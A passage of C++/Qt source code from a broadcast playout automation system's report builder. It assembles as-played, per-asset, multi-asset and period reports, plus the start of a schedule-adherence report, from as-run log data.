    if (name == "asplayed") return asPlayed(q);
    if (name == "asset") return asset(q);
    if (name == "assets") return assets(q);
    if (name == "full") return full(q);
    if (name == "adherence") return adherence(q);
    if (name == "contracts") return contracts(q);
    if (name == "top") return top(q);
    if (name == "compare") return compare(q);
    QJsonObject o; o["error"] = "unknown report '" + name + "' (" + names().join("|") + ")"; o["status"] = 404; return o;
}

QByteArray ReportBuilder::html(const QString& name, const QJsonObject& d) const {
    if (d.contains("error")) return shell("Report error", d.value("error").toString(), none(d.value("error").toString()));
    if (name == "asplayed") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlAsPlayed(d), "As-played log");
    if (name == "asset") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlAsset(d), "Asset report");
    if (name == "assets") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlAssets(d), "Assets report");
    if (name == "full") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlFull(d), "Period report");
    if (name == "adherence") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlAdherence(d), "Schedule adherence");
    if (name == "contracts") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlContracts(d), "Ad contract delivery");
    if (name == "top") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlTop(d), "Top assets");
    if (name == "compare") return shell(d.value("title").toString(), d.value("subtitle").toString(), htmlCompare(d), "Asset comparison");
    return shell("Unknown report", name, none("unknown report"));
}

// ---------------------------------------------------------------------------
// Shared lookups
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::brand() const {
    QJsonObject b = m_store ? m_store->settingJson("station.brand") : QJsonObject();
    QString name = b.value("name").toString();
    if (name.isEmpty() && m_store) { const QList<ChannelProfile> ch = m_store->channels(); if (!ch.isEmpty()) name = ch.first().brandName; }
    if (name.isEmpty()) name = "PLAY PLAY";
    b["name"] = name;
    if (b.value("tagline").toString().isEmpty()) b["tagline"] = "Broadcast playout automation";
    if (b.value("footer").toString().isEmpty()) b["footer"] = name + " · PLAY PLAY as-run reporting";
    if (b.value("accent").toString().isEmpty()) b["accent"] = "#d80018";
    if (!b.contains("logoUrl")) b["logoUrl"] = "";
    return b;
}

QTimeZone ReportBuilder::tzFor(const QString& channelId) const {
    if (m_store) {
        if (!channelId.isEmpty()) { bool f = false; const ChannelProfile p = m_store->channel(channelId, &f); if (f) return p.tz(); }
        const QList<ChannelProfile> ch = m_store->channels(); if (!ch.isEmpty()) return ch.first().tz();
    }
    return QTimeZone::systemTimeZone();
}
QString ReportBuilder::defaultChannel() const { const QList<ChannelProfile> ch = m_store ? m_store->channels() : QList<ChannelProfile>(); return ch.isEmpty() ? QString() : ch.first().id; }
QString ReportBuilder::channelLabel(const QString& channelId) const {
    if (channelId.isEmpty()) return "all channels";
    bool f = false; const ChannelProfile p = m_store ? m_store->channel(channelId, &f) : ChannelProfile();
    if (!f) return channelId;
    return p.callLetters.isEmpty() ? (p.name.isEmpty() ? p.id : p.name) : p.callLetters + " · " + p.name;
}
QJsonArray ReportBuilder::channelsJson() const {
    QJsonArray a; if (!m_store) return a;
    for (const ChannelProfile& p : m_store->channels()) { QJsonObject o; o["id"] = p.id; o["name"] = p.name; o["callLetters"] = p.callLetters; o["timezone"] = p.timezone; a.append(o); }
    return a;
}

void ReportBuilder::resolveRange(const Q& q, const QTimeZone& tz, QDate* from, QDate* to, QString* label, QString* period) const {
    const QDate today = todayIn(tz);
    QString p = q.value("period").trimmed().toLower();
    const QDate anchor = parseDate(q.value("date"), today);
    // HTML forms submit every field, so an unused From / To arrives as `from=&to=`: only a non-empty value makes the range custom.
    if (p.isEmpty()) p = (!q.value("from").trimmed().isEmpty() || !q.value("to").trimmed().isEmpty()) ? "custom" : "daily";
    if (p == "weekly") { *from = anchor.addDays(-scheduleDow(anchor)); *to = from->addDays(6); *label = "Week of " + QLocale::c().toString(*from, "MMMM d yyyy"); }
    else if (p == "monthly") { *from = QDate(anchor.year(), anchor.month(), 1); *to = from->addMonths(1).addDays(-1); *label = QLocale::c().toString(*from, "MMMM yyyy"); }
    else if (p == "quarterly") { const int qm = ((anchor.month() - 1) / 3) * 3 + 1; *from = QDate(anchor.year(), qm, 1); *to = from->addMonths(3).addDays(-1); *label = QString("Q%1 %2").arg((qm - 1) / 3 + 1).arg(anchor.year()); }
    else if (p == "annually" || p == "yearly") { *from = QDate(anchor.year(), 1, 1); *to = QDate(anchor.year(), 12, 31); *label = QString::number(anchor.year()); }
    else if (p == "custom") { *from = parseDate(q.value("from"), parseDate(q.value("to"), today)); *to = parseDate(q.value("to"), *from); if (*to < *from) std::swap(*from, *to); *label = *from == *to ? longDate(*from) : isoDate(*from) + " → " + isoDate(*to); }
    else { p = "daily"; *from = anchor; *to = anchor; *label = longDate(anchor); }
    if (from->daysTo(*to) > kMaxDays) { *to = from->addDays(kMaxDays); *label += " (capped to 366 days)"; }
    *period = p;
}

// ---------------------------------------------------------------------------
// 1. As-played
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::asPlayed(const Q& q) const {
    QString channel = q.contains("channel") ? q.value("channel") : defaultChannel();
    if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    QDate from, to; QString label, period; resolveRange(q, tz, &from, &to, &label, &period);
    const qint64 fromMs = dayStart(from, tz), toMs = dayStart(to.addDays(1), tz) - 1;
    const QString type = q.value("type"), origin = q.value("origin"), text = q.value("q").trimmed(), events = q.value("events");
    const int limit = clampInt(q.value("limit"), 5000, 1, 20000);

    struct H { int airings = 0, late = 0; double sec = 0; } hours[24];
    int total = 0, airings = 0, scheduled = 0, onTime = 0, late5 = 0, skipped = 0, failed = 0, trunc = 0, fillCount = 0; double airedSec = 0, fillSec = 0, absVar = 0;
    QJsonArray rows; QSet<QString> assetsSeen;
    const bool truncated = scanRows(m_store, channel, fromMs, toMs, [&](const AsRunRow& r) {
        if (!type.isEmpty() && r.type != type) return;
        if (!origin.isEmpty() && r.origin != origin) return;
        if (!events.isEmpty() && events != "all" && r.eventType != events) return;
        if (!text.isEmpty() && !r.title.contains(text, Qt::CaseInsensitive) && !r.assetId.contains(text, Qt::CaseInsensitive)) return;
        ++total;
        const int h = localHour(r.actualStartMs > 0 ? r.actualStartMs : r.plannedStartMs, tz);
        if (r.eventType == "START") {
            ++airings; airedSec += r.actualDurationMs / 1000.0; hours[h].airings++; hours[h].sec += r.actualDurationMs / 1000.0;
            if (!r.assetId.isEmpty()) assetsSeen.insert(r.assetId);
            if (r.plannedStartMs > 0) { ++scheduled; absVar += qAbs(double(r.varianceMs)); if (r.status == "ON_TIME") ++onTime; if (r.varianceMs > 5000) { ++late5; hours[h].late++; } }
            if (r.origin == "fill" || r.origin == "emergency") { ++fillCount; fillSec += r.actualDurationMs / 1000.0; }
        } else if (r.eventType == "SKIP") ++skipped; else if (r.eventType == "FAILED") ++failed; else if (r.eventType == "TRUNCATED") ++trunc;
        if (rows.size() < limit) rows.append(rowJson(r, tz));
    });

    QJsonArray hoursA; for (int h = 0; h < 24; ++h) { QJsonObject o; o["hour"] = h; o["label"] = QString("%1").arg(h, 2, 10, QChar('0')); o["airings"] = hours[h].airings; o["airedSec"] = hours[h].sec; o["late"] = hours[h].late; hoursA.append(o); }
    QJsonObject s; s["events"] = total; s["airings"] = airings; s["scheduled"] = scheduled; s["onTime"] = onTime; s["onTimePct"] = scheduled > 0 ? 100.0 * onTime / scheduled : QJsonValue();
    s["late5s"] = late5; s["skipped"] = skipped; s["failed"] = failed; s["truncated"] = trunc; s["fill"] = fillCount; s["fillSec"] = fillSec; s["airedSec"] = airedSec; s["uniqueAssets"] = assetsSeen.size();
    s["avgAbsVarianceSec"] = scheduled > 0 ? absVar / scheduled / 1000.0 : 0.0;
    QJsonObject o; o["report"] = "asplayed"; o["channel"] = channel; o["channelName"] = channelLabel(channel); o["timezone"] = QString::fromUtf8(tz.id()); o["period"] = period; o["label"] = label;
    o["from"] = isoDate(from); o["to"] = isoDate(to); o["fromMs"] = double(fromMs); o["toMs"] = double(toMs);
    QJsonObject f; f["type"] = type; f["origin"] = origin; f["q"] = text; f["events"] = events; o["filters"] = f;
    o["rows"] = rows; o["rowCount"] = rows.size(); o["truncated"] = truncated || total > rows.size(); o["summary"] = s; o["hours"] = hoursA;
    o["title"] = "As-Played Report — " + label; o["subtitle"] = channelLabel(channel) + " · " + QString::fromUtf8(tz.id()) + (text.isEmpty() ? QString() : " · “" + text + "”") + (type.isEmpty() ? QString() : " · type " + type) + (origin.isEmpty() ? QString() : " · origin " + origin);
    return o;
}

// ---------------------------------------------------------------------------
// 2. Per-asset report
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::asset(const Q& q) const {
    const QString id = q.value("id").trimmed();
    if (id.isEmpty()) { QJsonObject o; o["error"] = "id required"; o["status"] = 400; return o; }
    bool found = false; const MediaRecord m = m_store->media(id, &found);
    if (!found) { QJsonObject o; o["error"] = "asset not found: " + id; o["status"] = 404; return o; }
    QString channel = q.value("channel"); if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    const int days = clampInt(q.value("days"), 30, 1, kMaxDays);
    const QDate today = todayIn(tz), from = today.addDays(-(days - 1));
    const qint64 fromMs = dayStart(from, tz), toMs = dayStart(today.addDays(1), tz) - 1, nowMs = QDateTime::currentMSecsSinceEpoch();

    // --- airings in the window --------------------------------------------------------------------
    const ChanInfo ci(m_store, tz);
    QHash<QString, Agg> byChannel; int dp[6] = {0, 0, 0, 0, 0, 0}; double dpSec[6] = {0, 0, 0, 0, 0, 0};
    int airings = 0, scheduled = 0, onTime = 0, late = 0, early = 0, skipped = 0, failed = 0; double airtime = 0; qint64 firstMs = 0, lastMs = 0;
    QMap<QString, QJsonArray> byDay;   // iso date -> rows (QMap keeps days sorted)
    const bool truncated = scanRows(m_store, channel, fromMs, toMs, [&](const AsRunRow& r) {
        if (r.assetId != id) return;
        if (r.eventType != "START" && r.eventType != "SKIP" && r.eventType != "FAILED" && r.eventType != "TRUNCATED") return;
        const QTimeZone rtz = ci.tzOf(r.channelId);
        QJsonObject row = rowJson(r, rtz);
        row["asplayedUrl"] = QString("/reports/asplayed.html?channel=%1&date=%2#h-%2-%3").arg(QString::fromUtf8(QUrl::toPercentEncoding(r.channelId)), row.value("date").toString()).arg(row.value("hour").toInt());
        byDay[row.value("date").toString()].append(row);
        if (r.eventType == "START") {
            ++airings; airtime += r.actualDurationMs / 1000.0; if (firstMs == 0 || r.actualStartMs < firstMs) firstMs = r.actualStartMs; lastMs = qMax(lastMs, r.actualStartMs);
            if (r.plannedStartMs > 0) { ++scheduled; if (r.status == "ON_TIME") ++onTime; else if (r.status == "LATE_START") ++late; else if (r.status == "EARLY_START") ++early; }
            Agg& a = byChannel[r.channelId]; a.key = r.channelId; a.name = ci.labelOf(r.channelId); a.add(r);
            const int d = daypartIndex(localHour(r.actualStartMs, rtz)); dp[d]++; dpSec[d] += r.actualDurationMs / 1000.0;
        } else if (r.eventType == "SKIP") ++skipped; else if (r.eventType == "FAILED") ++failed;
    });
    QJsonArray daysA; for (auto it = byDay.constBegin(); it != byDay.constEnd(); ++it) { QJsonObject d; d["date"] = it.key(); d["rows"] = it.value(); d["count"] = it.value().size(); daysA.append(d); }
    QJsonArray dpA; for (int i = 0; i < 6; ++i) { QJsonObject o; o["name"] = QString::fromLatin1(kDayparts[i].name); o["airings"] = dp[i]; o["airtimeSec"] = dpSec[i]; dpA.append(o); }

    // --- upcoming as-scheduled placements (next 7 days of effective slots) ----------------------------
    QJsonArray upcoming; int directCount = 0, blockCount = 0;
    QList<ChannelProfile> chans = m_store->channels();
    for (const ChannelProfile& p : chans) {
        if (!channel.isEmpty() && p.id != channel) continue;
        if (!m.allowedChannels.isEmpty() && !m.allowedChannels.contains(p.id)) continue;
        const QTimeZone ptz = p.tz(); const QDate pToday = todayIn(ptz);
        for (int dayOff = 0; dayOff < 7; ++dayOff) {
            const QDate d = pToday.addDays(dayOff);
            for (int hour = 0; hour < 24; ++hour) {
                bool isOverride = false; const HourSlot slot = m_store->effectiveSlot(p.id, d, hour, &isOverride);
                if (slot.items.isEmpty()) continue;
                const qint64 hourStart = RunlistBuilder::hourStartUtcMs(d, hour, ptz);   // wall-clock hour: 23 / 25 h days shift later hours, never "day start + n x 1 h"
                double acc = 0;
                for (const SlotItem& it : slot.items) {
                    double startSec = acc;
                    if (it.isHardStart()) startSec = it.fixedUtcMs > 0 ? (it.fixedUtcMs - hourStart) / 1000.0 : it.fixedOffsetSec;
                    double dur = it.effectiveDurationSec(); if (dur <= 0) dur = it.durationSec;
                    acc = startSec + dur;
                    const qint64 atMs = hourStart + qint64(startSec * 1000.0);
                    if (atMs < nowMs) continue;
                    QString how;
                    if (it.mediaId == id) how = "direct";
                    else if (it.isQuery() && blockEligible(it, p.id, m, atMs)) how = "eligible via block";
                    else continue;
                    if (how == "direct") ++directCount; else ++blockCount;
                    QJsonObject u; u["channel"] = p.id; u["channelName"] = channelLabel(p.id); u["date"] = isoDate(d); u["hour"] = hour; u["slotId"] = slot.id; u["override"] = isOverride;
                    u["atMs"] = double(atMs); u["at"] = fmtTs(atMs, ptz, "ddd yyyy-MM-dd HH:mm:ss"); u["title"] = it.title; u["itemType"] = it.type; u["how"] = how; u["durationSec"] = dur;
                    u["hardStart"] = it.isHardStart(); u["locked"] = it.locked;
                    if (how != "direct") u["block"] = !it.query().isEmpty() ? it.query() : it.folder();
                    if (upcoming.size() < 500) upcoming.append(u);
                }
            }
        }
    }

    QJsonObject totals; totals["airings"] = airings; totals["airtimeSec"] = airtime; totals["scheduled"] = scheduled; totals["onTime"] = onTime; totals["late"] = late; totals["early"] = early;
    totals["skipped"] = skipped; totals["failed"] = failed; totals["onTimePct"] = scheduled > 0 ? 100.0 * onTime / scheduled : QJsonValue();
    totals["firstAired"] = fmtTs(firstMs, tz); totals["lastAired"] = fmtTs(lastMs, tz); totals["perDay"] = days > 0 ? double(airings) / days : 0.0;
    totals["byChannel"] = aggTable(byChannel, airtime, tz); totals["byDaypart"] = dpA; totals["upcomingDirect"] = directCount; totals["upcomingViaBlock"] = blockCount;
    QJsonObject o; o["report"] = "asset"; o["media"] = mediaCard(m, tz); o["days"] = days; o["from"] = isoDate(from); o["to"] = isoDate(today); o["channel"] = channel; o["timezone"] = QString::fromUtf8(tz.id());
    o["airingsByDay"] = daysA; o["totals"] = totals; o["upcoming"] = upcoming; o["truncated"] = truncated; o["neverAired"] = airings == 0 && m.playCount == 0;
    o["title"] = "Asset Report — " + (m.title.isEmpty() ? m.id : m.title);
    o["subtitle"] = QString("last %1 days (%2 → %3) · %4").arg(days).arg(isoDate(from), isoDate(today), channelLabel(channel));
    return o;
}

// ---------------------------------------------------------------------------
// 3. Assets report (many assets)
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::assets(const Q& q) const {
    QString channel = q.value("channel"); if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    const int days = clampInt(q.value("days"), 30, 1, kMaxDays), limit = clampInt(q.value("limit"), 200, 1, 800), perAsset = clampInt(q.value("rows"), 200, 1, 2000);
    const QDate today = todayIn(tz), from = today.addDays(-(days - 1));
    const qint64 fromMs = dayStart(from, tz), toMs = dayStart(today.addDays(1), tz) - 1;
    const QStringList ids = splitList(q.value("ids"));
    const QString text = q.value("q").trimmed(), type = q.value("type"), category = q.value("category"), client = q.value("client"), subcategory = q.value("subcategory"), series = q.value("series");

    // --- selection ---------------------------------------------------------------------------------
    MediaIndex idx(m_store);
    QList<MediaRecord> sel;     // copies: idx.find() pointers do not survive the next lookup (orphan check during the scan)
    if (!ids.isEmpty()) { for (const QString& id : ids) if (const MediaRecord* m = idx.find(id)) sel.append(*m); }
    else {
        // library filter: only here the library has to be read (narrowed to one type in SQL when a type is asked for)
        const bool withArchived = q.value("archived") == "1";
        const QList<MediaRecord> pool = type.isEmpty() ? m_store->allMedia(withArchived) : m_store->mediaByType({ type }, withArchived);
        for (const MediaRecord& m : pool) {
            if (!type.isEmpty() && m.type != type) continue;
            if (!category.isEmpty() && m.extra.value("category").toString().compare(category, Qt::CaseInsensitive) != 0) continue;
            if (!subcategory.isEmpty() && m.extra.value("subcategory").toString().compare(subcategory, Qt::CaseInsensitive) != 0) continue;
            if (!client.isEmpty() && m.client.compare(client, Qt::CaseInsensitive) != 0) continue;
            if (!series.isEmpty() && m.series.compare(series, Qt::CaseInsensitive) != 0) continue;
            if (!channel.isEmpty() && !m.allowedChannels.isEmpty() && !m.allowedChannels.contains(channel)) continue;
            if (!text.isEmpty()) {
                bool hit = m.title.contains(text, Qt::CaseInsensitive) || m.series.contains(text, Qt::CaseInsensitive) || m.client.contains(text, Qt::CaseInsensitive) || m.id.contains(text, Qt::CaseInsensitive)
                    || m.extra.value("category").toString().contains(text, Qt::CaseInsensitive) || m.extra.value("notes").toString().contains(text, Qt::CaseInsensitive);
                if (!hit) for (const auto& t : m.extra.value("tags").toArray()) if (t.toString().contains(text, Qt::CaseInsensitive)) { hit = true; break; }
                if (!hit) continue;
            }
            sel.append(m);
        }
        std::sort(sel.begin(), sel.end(), [](const MediaRecord& a, const MediaRecord& b) { return a.title.compare(b.title, Qt::CaseInsensitive) < 0; });
    }
    const bool selTruncated = sel.size() > limit; if (selTruncated) sel = sel.mid(0, limit);
    QHash<QString, int> pos; for (int i = 0; i < sel.size(); ++i) pos.insert(sel[i].id, i);

    // --- one pass over the window: bucket by asset; collect orphans (aired but not in the library) --
    struct Bucket { QJsonArray rows; int airings = 0, scheduled = 0, onTime = 0, late = 0, skipped = 0, failed = 0, hidden = 0; double airtime = 0; QSet<QString> channels; qint64 lastMs = 0; };
    QList<Bucket> buckets; buckets.resize(sel.size());
    QHash<QString, Agg> orphans; const ChanInfo ci(m_store, tz);
    int totAirings = 0, totScheduled = 0, totOnTime = 0, emitted = 0; double totAirtime = 0; QSet<QString> totChannels; bool emitCapped = false;
    const bool scanTruncated = scanRows(m_store, channel, fromMs, toMs, [&](const AsRunRow& r) {
        if (r.eventType != "START" && r.eventType != "SKIP" && r.eventType != "FAILED" && r.eventType != "TRUNCATED") return;
        if (r.eventType == "START" && !r.assetId.isEmpty() && !idx.find(r.assetId)) { Agg& a = orphans[r.assetId]; a.key = r.assetId; a.name = r.title.isEmpty() ? r.assetId : r.title; a.add(r); }
        auto it = pos.constFind(r.assetId); if (it == pos.constEnd()) return;
        Bucket& b = buckets[it.value()];
        // per-asset `rows` and a global kMaxEmitRows bound the body (800 assets x 2000 airings would be a ~1.6M-row page)
        if (b.rows.size() < perAsset && emitted < kMaxEmitRows) { b.rows.append(rowJson(r, ci.tzOf(r.channelId))); ++emitted; } else { ++b.hidden; if (emitted >= kMaxEmitRows) emitCapped = true; }
        if (r.eventType == "START") {
            ++b.airings; b.airtime += r.actualDurationMs / 1000.0; b.channels.insert(r.channelId); b.lastMs = qMax(b.lastMs, r.actualStartMs);
            ++totAirings; totAirtime += r.actualDurationMs / 1000.0; totChannels.insert(r.channelId);
            if (r.plannedStartMs > 0) { ++b.scheduled; ++totScheduled; if (r.status == "ON_TIME") { ++b.onTime; ++totOnTime; } else if (r.status == "LATE_START") ++b.late; }
        } else if (r.eventType == "SKIP") ++b.skipped; else if (r.eventType == "FAILED") ++b.failed;
    });

    QJsonArray assetsA; int neverAired = 0, airedAssets = 0;
    for (int i = 0; i < sel.size(); ++i) {
        const MediaRecord& m = sel[i]; const Bucket& b = buckets[i];
        QJsonObject a; a["media"] = mediaCard(m, tz); a["airings"] = b.airings; a["airtimeSec"] = b.airtime; a["scheduled"] = b.scheduled; a["onTime"] = b.onTime; a["late"] = b.late; a["skipped"] = b.skipped; a["failed"] = b.failed;
        a["onTimePct"] = b.scheduled > 0 ? 100.0 * b.onTime / b.scheduled : QJsonValue(); a["channels"] = toArray(b.channels); a["lastAired"] = fmtTs(b.lastMs, tz); a["rows"] = b.rows; a["hiddenRows"] = b.hidden;
        a["neverAired"] = b.airings == 0 && m.playCount == 0; a["noAiringsInWindow"] = b.airings == 0;
        if (b.airings == 0 && m.playCount == 0) ++neverAired; if (b.airings > 0) ++airedAssets;
        assetsA.append(a);
    }
    QJsonObject s; s["assets"] = sel.size(); s["airedAssets"] = airedAssets; s["neverAired"] = neverAired; s["airings"] = totAirings; s["airtimeSec"] = totAirtime; s["scheduled"] = totScheduled; s["onTime"] = totOnTime;
    s["onTimePct"] = totScheduled > 0 ? 100.0 * totOnTime / totScheduled : QJsonValue(); s["channels"] = toArray(totChannels); s["orphans"] = orphans.size();
    QJsonObject o; o["report"] = "assets"; o["days"] = days; o["from"] = isoDate(from); o["to"] = isoDate(today); o["channel"] = channel; o["timezone"] = QString::fromUtf8(tz.id());
    QJsonObject f; f["ids"] = toArray(ids); f["q"] = text; f["type"] = type; f["category"] = category; f["subcategory"] = subcategory; f["client"] = client; f["series"] = series; o["filters"] = f;
    o["assets"] = assetsA; o["summary"] = s; o["orphans"] = aggTable(orphans, totAirtime, tz, 200, true); o["truncated"] = scanTruncated || selTruncated || emitCapped;
    QString scope = ids.isEmpty() ? QString() : QString("%1 selected").arg(ids.size());
    if (!text.isEmpty()) scope += (scope.isEmpty() ? "" : " · ") + QString("“%1”").arg(text); if (!type.isEmpty()) scope += " · type " + type; if (!category.isEmpty()) scope += " · " + category; if (!client.isEmpty()) scope += " · client " + client;
    o["title"] = sel.size() == 1 ? "Asset Report — " + (sel[0].title.isEmpty() ? sel[0].id : sel[0].title) : QString("Assets Report — %1 assets").arg(sel.size());
    o["subtitle"] = QString("exact scheduled vs as-played times · last %1 days (%2 → %3) · %4%5").arg(days).arg(isoDate(from), isoDate(today), channelLabel(channel), scope.isEmpty() ? QString() : " · " + scope);
    return o;
}

// ---------------------------------------------------------------------------
// 4. Period / full report
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::full(const Q& q) const {
    QString channel = q.value("channel"); if (channel == "all") channel.clear();
    const QTimeZone tz = tzFor(channel);
    QDate from, to; QString label, period; resolveRange(q, tz, &from, &to, &label, &period);
    const qint64 fromMs = dayStart(from, tz), toMs = dayStart(to.addDays(1), tz) - 1;
    const QString group = q.value("group", "all").toLower();
    MediaIndex idx(m_store); const ChanInfo ci(m_store, tz);

    QHash<QString, Agg> byType, byClient, bySeries, byCategory, byChannel, byAsset, byOrigin;
    int airings = 0, scheduled = 0, onTime = 0, late = 0, early = 0, fillCount = 0; double airtime = 0, fillSec = 0; QSet<QString> assetsSeen; QJsonArray failures; int failureCount = 0;
    const bool truncated = scanRows(m_store, channel, fromMs, toMs, [&](const AsRunRow& r) {
        if (r.eventType == "FAILED" || r.eventType == "SKIP") { ++failureCount; if (failures.size() < 100) failures.append(rowJson(r, tz)); return; }
        if (r.eventType != "START") return;
        ++airings; airtime += r.actualDurationMs / 1000.0; if (!r.assetId.isEmpty()) assetsSeen.insert(r.assetId);
        if (r.plannedStartMs > 0) { ++scheduled; if (r.status == "ON_TIME") ++onTime; else if (r.status == "LATE_START") ++late; else if (r.status == "EARLY_START") ++early; }
        if (r.origin == "fill" || r.origin == "emergency") { ++fillCount; fillSec += r.actualDurationMs / 1000.0; }
        const MediaRecord* m = idx.find(r.assetId);
        auto bump = [&](QHash<QString, Agg>& h, const QString& key, const QString& name) { Agg& a = h[key]; a.key = key; a.name = name; a.add(r); };
        bump(byChannel, r.channelId, ci.labelOf(r.channelId));
        bump(byType, r.type.isEmpty() ? "unknown" : r.type, r.type.isEmpty() ? "unknown" : r.type);
        bump(byOrigin, r.origin.isEmpty() ? "schedule" : r.origin, r.origin.isEmpty() ? "schedule" : r.origin);
        if (r.type == "ad" || r.type == "promo" || r.type == "psa" || (m && !m->client.isEmpty())) { const QString c = m && !m->client.isEmpty() ? m->client : "— unattributed —"; bump(byClient, c, c); }
        if (m && !m->series.isEmpty()) bump(bySeries, m->series, m->series); else if (r.type == "program") bump(bySeries, "title:" + r.title, r.title);
        const QString cat = m ? m->extra.value("category").toString() : QString(); bump(byCategory, cat.isEmpty() ? "— uncategorised —" : cat, cat.isEmpty() ? "— uncategorised —" : cat);
        bump(byAsset, r.assetId.isEmpty() ? "title:" + r.title : r.assetId, r.title.isEmpty() ? r.assetId : r.title);
    });

    QJsonArray sections;
    auto section = [&](const QString& key, const QString& title, const QHash<QString, Agg>& h) { if (group != "all" && group != key) return; QJsonObject s; s["key"] = key; s["title"] = title; s["rows"] = aggTable(h, airtime, tz, 200); sections.append(s); };
    section("type", "By content type", byType); section("client", "By client", byClient); section("series", "By program / series", bySeries); section("category", "By category", byCategory); section("origin", "By origin", byOrigin);
    const QJsonArray topAssets = aggTable(byAsset, airtime, tz, 25, true), perChannel = aggTable(byChannel, airtime, tz);

    // --- narrative (plain template over the numbers) --------------------------------------------------
    QString narrative;
    if (airings == 0) narrative = QString("No airings were logged for %1 in %2.").arg(channelLabel(channel), label);
    else {
        narrative = QString("During %1, %2 aired %3 items totalling %4 of airtime across %5 unique assets").arg(label, channelLabel(channel)).arg(airings).arg(hms(airtime)).arg(assetsSeen.size());
        if (byChannel.size() > 1) narrative += QString(" on %1 channels").arg(byChannel.size());
        narrative += ". ";
        if (scheduled > 0) narrative += QString("%1 of the %2 scheduled starts were on time (%3 late, %4 early)").arg(pct(onTime, scheduled)).arg(scheduled).arg(late).arg(early) + (failureCount ? QString(", and %1 items failed or were skipped. ").arg(failureCount) : QString(". "));
        else if (failureCount) narrative += QString("%1 items failed or were skipped. ").arg(failureCount);
        if (fillCount) narrative += QString("Fill and emergency material accounted for %1 of airtime (%2, %3 items). ").arg(pct(fillSec, airtime), hms(fillSec)).arg(fillCount);
        else narrative += "No fill or emergency material was needed. ";
        if (!topAssets.isEmpty()) { const QJsonObject t = topAssets.first().toObject(); narrative += QString("The most-aired asset was “%1” with %2 airings").arg(t.value("name").toString()).arg(t.value("airings").toInt()); }
        const QJsonArray tt = aggTable(byType, airtime, tz, 1);
        if (!tt.isEmpty()) { const QJsonObject t = tt.first().toObject(); narrative += QString("%1%2 content led by airtime with a %3 share.").arg(topAssets.isEmpty() ? QString() : QStringLiteral("; "), t.value("name").toString(), pct(t.value("airtimeSec").toDouble(), airtime)); }
        else if (!topAssets.isEmpty()) narrative += ".";
    }

    QJsonObject totals; totals["airings"] = airings; totals["airtimeSec"] = airtime; totals["uniqueAssets"] = assetsSeen.size(); totals["scheduled"] = scheduled; totals["onTime"] = onTime; totals["late"] = late; totals["early"] = early;
    totals["onTimePct"] = scheduled > 0 ? 100.0 * onTime / scheduled : QJsonValue(); totals["fill"] = fillCount; totals["fillSec"] = fillSec; totals["fillPct"] = airtime > 0 ? 100.0 * fillSec / airtime : 0.0; totals["failures"] = failureCount; totals["channels"] = byChannel.size();
    QJsonObject o; o["report"] = "full"; o["period"] = period; o["label"] = label; o["from"] = isoDate(from); o["to"] = isoDate(to); o["group"] = group; o["channel"] = channel; o["channelName"] = channelLabel(channel); o["timezone"] = QString::fromUtf8(tz.id());
    o["totals"] = totals; o["sections"] = sections; o["topAssets"] = topAssets; o["perChannel"] = perChannel; o["failures"] = failures; o["narrative"] = narrative; o["truncated"] = truncated;
    o["title"] = label + " — As-Played Report"; o["subtitle"] = QString("%1 → %2 · %3 · grouped by %4").arg(isoDate(from), isoDate(to), channelLabel(channel), group);
    return o;
}

// ---------------------------------------------------------------------------
// 5. Adherence (as-scheduled vs as-played for one channel-day)
// ---------------------------------------------------------------------------
QJsonObject ReportBuilder::adherence(const Q& q) const {
    const QString channel = q.contains("channel") && !q.value("channel").isEmpty() ? q.value("channel") : defaultChannel();
    if (channel.isEmpty()) { QJsonObject o; o["error"] = "no channels configured"; o["status"] = 400; return o; }
    const QTimeZone tz = tzFor(channel);
    const QDate date = parseDate(q.value("date"), todayIn(tz));
    const double tol = clampDouble(q.value("toleranceSec"), 90.0, 0.0, 3600.0);
    const qint64 dayMs = dayStart(date, tz), endMs = dayStart(date.addDays(1), tz) - 1;
    const qint64 nowMs = QDateTime::currentMSecsSinceEpoch(), tolMs = qint64(tol * 1000.0);

    // aired START rows bucketed by hour (planned hour when known, else actual)
    QHash<int, QList<AsRunRow>> airedByHour; int airedTotal = 0;
    scanRows(m_store, channel, dayMs, endMs, [&](const AsRunRow& r) { if (r.eventType != "START") return; ++airedTotal; airedByHour[localHour(r.plannedStartMs > 0 ? r.plannedStartMs : r.actualStartMs, tz)].append(r); });

    QJsonArray items, hoursA, unscheduled; int planned = 0, cOn = 0, cLate = 0, cEarly = 0, cMissed = 0, cPending = 0, cUns = 0;
    QList<QJsonObject> matchedItems;
    static const QRegularExpression digits(QStringLiteral("^\\d+$")), digitsPair(QStringLiteral("^\\d+(#\\d+)?$"));
    for (int hour = 0; hour < 24; ++hour) {
        const HourSlot slot = m_store->effectiveSlot(channel, date, hour);
        const qint64 hourStart = RunlistBuilder::hourStartUtcMs(date, hour, tz);   // the executor's hour start (wall clock; 23 / 25 h days included)
        QList<AsRunRow> pool = airedByHour.value(hour);
        QList<bool> used; used.resize(pool.size()); for (int i = 0; i < used.size(); ++i) used[i] = false;
        int hPlanned = 0, hOn = 0, hLate = 0, hEarly = 0, hMissed = 0, hPending = 0;
        // Does this aired row belong to the slot item? Rows carry the slot item id; a query/folder block airs as several rows whose ids are
        // "<blockId>#<k>" (RunlistBuilder::expandQuery). Runlist ids are "<slotId>#<itemId>#<n>" ('#', never ':').
        auto belongs = [&](const AsRunRow& r, const SlotItem& it, bool block) {
            if (it.id.isEmpty()) return false;
            if (r.itemId == it.id) return true;
            if (block && r.itemId.startsWith(it.id + "#")) return true;
            const QString pre = slot.id + "#" + it.id + "#";
            return r.runlistItemId.startsWith(pre) && (block ? digitsPair : digits).match(r.runlistItemId.mid(pre.size())).hasMatch();
        };
        double acc = 0;
        for (const SlotItem& it : slot.items) {
            double startSec = acc;
